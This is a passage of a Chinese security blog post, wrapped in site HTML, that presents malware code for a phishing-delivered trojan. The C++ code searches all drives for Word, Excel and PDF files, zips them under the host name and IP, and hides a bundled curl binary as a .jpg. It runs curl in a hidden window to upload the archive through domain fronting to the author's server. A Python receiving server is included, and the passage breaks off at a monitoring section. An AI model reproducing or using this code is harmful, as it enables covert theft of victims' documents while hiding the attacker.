@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="炮灰马之文件窃取功能">
+<meta property="og:url" content="https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/index.html">
+<meta property="og:site_name" content="c1y2m3&#39;s blog">
+<meta property="og:description" content="极客兔兔的小站，致力于分享一些技术教程和有趣的技术实践。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/_20201118180436.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/_20201113113234.png">
+<meta property="og:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/xxxxd.gif">
+<meta property="article:published_time" content="2020-11-23T03:51:24.000Z">
+<meta property="article:modified_time" content="2022-12-01T10:19:12.000Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c1y2m3.oss-cn-beijing.aliyuncs.com/_20201118180436.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>炮灰马之文件窃取功能</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/life/">漂泊</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/c1y2m3">github</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/11/19/%E5%85%B3%E4%BA%8E%E9%92%93%E9%B1%BC%E4%B8%8A%E7%BA%BF%E5%90%8E%E5%BE%AE%E4%BF%A1%E5%88%A9%E7%94%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2020/08/24/%E5%88%A9%E7%94%A8%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%9C%AF%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDshellcode/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&text=炮灰马之文件窃取功能"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&is_video=false&description=炮灰马之文件窃取功能"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=炮灰马之文件窃取功能&body=Check out this article: https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&title=炮灰马之文件窃取功能"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&name=炮灰马之文件窃取功能&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://c1y2m3.github.io/2020/11/23/%E7%82%AE%E7%81%B0%E9%A9%AC%E4%B9%8B%E6%96%87%E4%BB%B6%E7%AA%83%E5%8F%96%E5%8A%9F%E8%83%BD/&t=炮灰马之文件窃取功能"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8D%95%E5%8A%9F%E8%83%BD%E7%89%88"><span class="toc-number">2.</span> <span class="toc-text">一、单功能版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%94%B9%E8%BF%9B%E7%89%88"><span class="toc-number">3.</span> <span class="toc-text">二、改进版</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AA%83%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">窃取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E6%94%B6%E6%96%87%E4%BB%B6"><span class="toc-number">5.</span> <span class="toc-text">接收文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E7%9B%91%E6%8E%A7"><span class="toc-number">6.</span> <span class="toc-text">数据监控</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%B1%95%E7%A4%BA"><span class="toc-number">7.</span> <span class="toc-text">文件展示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8"><span class="toc-number">8.</span> <span class="toc-text">启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA"><span class="toc-number">9.</span> <span class="toc-text">演示</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        炮灰马之文件窃取功能
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-23T03:51:24.000Z" itemprop="datePublished">2020-11-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>通常情况下,当我们前期通过发信拿到目标机器权限之后的第一件事就是想办法快速维权和尽可能多的搜集敏感信息，本文针对邮件马添加针对特定类型的敏感文件搜索功能和上传功能，尽量用最快的时间,最隐蔽稳定的方式,做最多的事情。</p>
+<h3 id="一、单功能版"><a href="#一、单功能版" class="headerlink" title="一、单功能版"></a>一、单功能版</h3><p>C++ GetLogicalDriveStringsA枚举磁盘列表、遍历指定盘搜索特定类型文件包括CS反射DLL版本。<br><a target="_blank" rel="noopener" href="https://github.com/c1y2m3/FileSearch">https://github.com/c1y2m3/FileSearch</a><br>用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">System Drive are:C:\D:\</span><br><span class="line">Command:FileSearch.exe Drive Keyword</span><br><span class="line">Example:FileSearch.exe C:\ docx</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://c1y2m3.oss-cn-beijing.aliyuncs.com/_20201118180436.png" alt="_20201118180436.png"></p>
+<h3 id="二、改进版"><a href="#二、改进版" class="headerlink" title="二、改进版"></a>二、改进版</h3><p>在原项目基础上遍历全盘指定文件后缀，如docx,xlsx,pdf等敏感文件压缩打包并通过域前置上传到服务器，使用Server酱通知，提供后端进行展示下载，配合邮件马释放使用。</p>
+<h3 id="窃取文件"><a href="#窃取文件" class="headerlink" title="窃取文件"></a>窃取文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">void FindFile(char* pfilename, char* pfilter, char* fname,char* tempdir)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	WIN32_FIND_DATA findfiledate;</span><br><span class="line">	HANDLE hfind;</span><br><span class="line">	char filename[1000];</span><br><span class="line">	char lpFileName[1000];</span><br><span class="line">	char _lpFileName[1000];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	char source[1000];</span><br><span class="line">	char target[1000];</span><br><span class="line"></span><br><span class="line">	int i;</span><br><span class="line">	for (i = 0; *(pfilename + i) != &#x27;\0&#x27;; i++)</span><br><span class="line">		filename[i] = *(pfilename + i);</span><br><span class="line">	filename[i] = &#x27;\0&#x27;;</span><br><span class="line">	//如果最后一字符不是&#x27;\&#x27;</span><br><span class="line">	if (filename[strlen(filename) - 1] != &#x27;\\&#x27;)</span><br><span class="line">		strcat(filename, &quot;\\&quot;); //添加&#x27;\&#x27;</span><br><span class="line">	strcpy(lpFileName, filename);</span><br><span class="line">	strcat(lpFileName, pfilter);</span><br><span class="line">	hfind = FindFirstFile(lpFileName, &amp;findfiledate);</span><br><span class="line">	if (hfind == INVALID_HANDLE_VALUE)</span><br><span class="line">		return;</span><br><span class="line">	do</span><br><span class="line">	&#123;</span><br><span class="line">		if (!(findfiledate.dwFileAttributes&amp;FILE_ATTRIBUTE_DIRECTORY))</span><br><span class="line">		&#123;</span><br><span class="line">			//如果找到指定文件</span><br><span class="line">			if (strstr(findfiledate.cFileName, fname))</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;%s%s\n&quot;, filename,findfiledate.cFileName);</span><br><span class="line"></span><br><span class="line">				lstrcpy(source, filename);</span><br><span class="line">				lstrcpy(target, tempdir);</span><br><span class="line">				lstrcat(source, &quot;\\*.*&quot;);</span><br><span class="line">				lstrcat(target, &quot;\\&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				memset(source, &#x27;0&#x27;, sizeof(source));</span><br><span class="line">				lstrcpy(source, filename);</span><br><span class="line">				lstrcat(source, &quot;\\&quot;);</span><br><span class="line">				lstrcat(source, findfiledate.cFileName);</span><br><span class="line">				lstrcat(target, findfiledate.cFileName);</span><br><span class="line">				CopyFile(source, target, TRUE);</span><br><span class="line">				count++;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			if (findfiledate.cFileName[0] != &#x27;.&#x27;)</span><br><span class="line">			&#123;</span><br><span class="line">				strcpy(_lpFileName, filename);</span><br><span class="line">				strcat(_lpFileName, (const char*)findfiledate.cFileName);</span><br><span class="line">				FindFile(_lpFileName, pfilter,fname,tempdir);  </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; while (FindNextFile(hfind, &amp;findfiledate));</span><br><span class="line">	FindClose(hfind);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	char szLogicalDriveStrings[BUFSIZE];</span><br><span class="line">	DWORD iLength;</span><br><span class="line">	int iSub;</span><br><span class="line">	static TCHAR tempdir[MAX_PATH];</span><br><span class="line"></span><br><span class="line">	// 创建临时文件夹</span><br><span class="line">	GetTempPath(sizeof(strTmpPath), strTmpPath);</span><br><span class="line">	strcat(strTmpPath, &quot;\\&quot;);</span><br><span class="line">	char szDirName[] = &quot;wpsoffice&quot;;</span><br><span class="line">	strcat(tempdir, strTmpPath);</span><br><span class="line">	strcat(tempdir, szDirName);</span><br><span class="line">	CreateDirectory(tempdir, NULL);</span><br><span class="line"></span><br><span class="line">	const char* filetype[] = &#123; &quot;.doc&quot;,&quot;.xls&quot;, &quot;.pdf&quot; &#125;;</span><br><span class="line"></span><br><span class="line">	ZeroMemory(szLogicalDriveStrings, BUFSIZE);</span><br><span class="line">	iLength = GetLogicalDriveStringsA(BUFSIZE - 1, szLogicalDriveStrings);</span><br><span class="line">	for (iSub = 0; iSub &lt; iLength; iSub += 4)</span><br><span class="line">	&#123;</span><br><span class="line">		for (int i = 0; i &lt; 2; i++)</span><br><span class="line">		&#123;</span><br><span class="line">    //全盘查找文件</span><br><span class="line">			FindFile((char *)szLogicalDriveStrings + iSub, (char *)&quot;*.*&quot;, (char *)filetype[i], tempdir);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>C++ 调用第三方minizip库进行文件夹递归压缩，打包完的文件名为主机名-ipv4.zip<br>codeproject下载地址：<a target="_blank" rel="noopener" href="http://www.codeproject.com/KB/files/zip_utils.aspx%E3%80%82">http://www.codeproject.com/KB/files/zip_utils.aspx。</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> char strTmpPath[MAX_PATH];</span><br><span class="line">static TCHAR SaveFile[MAX_PATH];</span><br><span class="line">static TCHAR tempzip[MAX_PATH];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 初始化套接字库</span><br><span class="line">WORD wVersionRequested = MAKEWORD(2, 0); // 套接字版本</span><br><span class="line">WSADATA data;</span><br><span class="line">int nRes = ::WSAStartup(wVersionRequested, &amp;data);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char HostName[128];</span><br><span class="line">gethostname(HostName, sizeof(HostName));// 获得本机主机名.</span><br><span class="line">hostent* hn;</span><br><span class="line">hn = gethostbyname(HostName);//根据本机主机名得到本机ip</span><br><span class="line">char *chIP = inet_ntoa(*(struct in_addr *)hn-&gt;h_addr_list[0]);//把ip换成字符串形式</span><br><span class="line">::WSACleanup();</span><br><span class="line"></span><br><span class="line">char strBuffer[256] = &#123; 0 &#125;;</span><br><span class="line">//DWORD dwSize = 256;</span><br><span class="line">//GetUserName(strBuffer, &amp;dwSize);</span><br><span class="line">strcat_s(HostName, &quot;-&quot;);</span><br><span class="line">strcat_s(HostName, chIP);</span><br><span class="line">strcat_s(HostName, &quot;.zip&quot;);</span><br><span class="line"> </span><br><span class="line"> strcat_s(tempzip, strTmpPath);</span><br><span class="line">strcat_s(tempzip, HostName);</span><br><span class="line">//printf(tempzip);</span><br><span class="line">DWORD zResult = ZR_OK;</span><br><span class="line">HZIP hz = CreateZip(tempzip, 0);</span><br><span class="line">LPCTSTR lpszSrcPath = tempdir;</span><br><span class="line">zResult = DirToZip(hz, lpszSrcPath, _tcsclen(lpszSrcPath));</span><br><span class="line">CloseZip(hz);</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="接收文件"><a href="#接收文件" class="headerlink" title="接收文件"></a>接收文件</h3><p>参考链接：<a target="_blank" rel="noopener" href="https://floatingoctothorpe.uk/2017/receiving-files-over-http-with-python.html">https://floatingoctothorpe.uk/2017/receiving-files-over-http-with-python.html</a><br>使用<code>curl</code>或<code>wget</code>将打包压缩的文件上传Put到文件服务器<br>example:python http_server.py 80 &#x2F;opt&#x2F;rh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;Extend Python&#x27;s built in HTTP server to save files</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import os</span><br><span class="line">import logging</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">    import http.server as server</span><br><span class="line">except ImportError:</span><br><span class="line">    # Handle Python 2.x</span><br><span class="line">    import SimpleHTTPServer as server</span><br><span class="line"></span><br><span class="line">log_path = &#x27;run_server_logs.log&#x27;</span><br><span class="line">logging.basicConfig(level=logging.INFO,format=&#x27;%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s&#x27;,datefmt=&#x27;%a, %d %b %Y %H:%M:%S&#x27;,filename=log_path)</span><br><span class="line">class HTTPRequestHandler(server.SimpleHTTPRequestHandler):</span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        self.send_response(404)</span><br><span class="line">        self.wfile.write(&quot;404 Not Found&quot;)</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;Extend SimpleHTTPRequestHandler to handle PUT requests&quot;&quot;&quot;</span><br><span class="line">    def do_PUT(self):</span><br><span class="line">        &quot;&quot;&quot;Save a file following a HTTP PUT request&quot;&quot;&quot;</span><br><span class="line">        filename = os.path.basename(self.path)</span><br><span class="line"></span><br><span class="line">        # Don&#x27;t overwrite files</span><br><span class="line">        if os.path.exists(filename):</span><br><span class="line">            self.send_response(409, &#x27;Conflict&#x27;)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            reply_body = &#x27;&quot;%s&quot; already exists\n&#x27; % filename</span><br><span class="line">            self.wfile.write(reply_body.encode(&#x27;utf-8&#x27;))</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        file_length = int(self.headers[&#x27;Content-Length&#x27;])</span><br><span class="line">        output_file = &#x27;tmp.txt&#x27;</span><br><span class="line">        with open(filename, &#x27;wb&#x27;) as output_file:</span><br><span class="line">            output_file.write(self.rfile.read(file_length))</span><br><span class="line">        self.send_response(201, &#x27;Created&#x27;)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        reply_body = &#x27;Saved &quot;%s&quot;\n&#x27; % filename</span><br><span class="line">        logging.info(self.headers)</span><br><span class="line">        self.wfile.write(reply_body.encode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    if sys.argv[2:]:</span><br><span class="line">        os.chdir(sys.argv[2])</span><br><span class="line">    server.test(HandlerClass=HTTPRequestHandler)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接请求容易暴露自己的服务器地址，增加溯源风险，所以这里用到了域前置，有效的隐藏服务器地址<br>在临时目录下释放curl客户端原文件，设置CreateProcess STARTUPINFO中的wShowWindow为SW_HIDE，进程以隐藏的方式在后台运行上传。<br>example：curl.exe -X PUT –upload-file xxx.zip 202.xxx.xxx.xx -H “Host:login.x.com”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// 客户端上传</span><br><span class="line">	char name[20];</span><br><span class="line">	char *exe = randstr(name, 7);</span><br><span class="line">	strcat_s(SaveFile, strTmpPath);</span><br><span class="line">	strcat_s(SaveFile, exe);</span><br><span class="line">	strcat_s(SaveFile, TEXT(&quot;.jpg&quot;));</span><br><span class="line">	BOOL bRes = ReleaseLibrary(IDR_LLFK1, (CHAR*)&quot;LLFK&quot;, (CHAR*)SaveFile);</span><br><span class="line"></span><br><span class="line">	strcat(SaveFile, (&quot; -X PUT --upload-file &quot;));</span><br><span class="line">	strcat(SaveFile, (tempzip));</span><br><span class="line">	strcat(SaveFile, TEXT(&quot; x8.xx1.x0.13 -H  \&quot;Host:login.com\&quot; &quot;));</span><br><span class="line"></span><br><span class="line">	STARTUPINFO StartupInfo;</span><br><span class="line">	PROCESS_INFORMATION   ProcessInfo;</span><br><span class="line">	GetStartupInfo(&amp;StartupInfo);</span><br><span class="line">	StartupInfo.lpReserved = NULL;</span><br><span class="line">	StartupInfo.lpDesktop = NULL;</span><br><span class="line">	StartupInfo.lpTitle = NULL;</span><br><span class="line">	StartupInfo.dwX = 0;</span><br><span class="line">	StartupInfo.dwY = 0;</span><br><span class="line">	StartupInfo.dwXSize = 0;</span><br><span class="line">	StartupInfo.dwYSize = 0;</span><br><span class="line">	StartupInfo.dwXCountChars = 500;</span><br><span class="line">	StartupInfo.dwYCountChars = 500;</span><br><span class="line">	StartupInfo.dwFlags = STARTF_USESHOWWINDOW;</span><br><span class="line">	StartupInfo.wShowWindow = SW_HIDE;</span><br><span class="line">	StartupInfo.cbReserved2 = 0;</span><br><span class="line">	StartupInfo.lpReserved2 = NULL;</span><br><span class="line">	StartupInfo.hStdInput = stdin;</span><br><span class="line">	StartupInfo.hStdOutput = stdout;</span><br><span class="line">	StartupInfo.hStdError = stderr;</span><br><span class="line">	CreateProcessA(NULL, SaveFile, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &amp;StartupInfo, &amp;ProcessInfo);</span><br><span class="line">	//&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="数据监控"><a href="#数据监控" class="headerlink" title="数据监控"></a>数据监控</h3><p>文件上传成功后使用Server酱进行文件上传提醒</p>
+<ul>
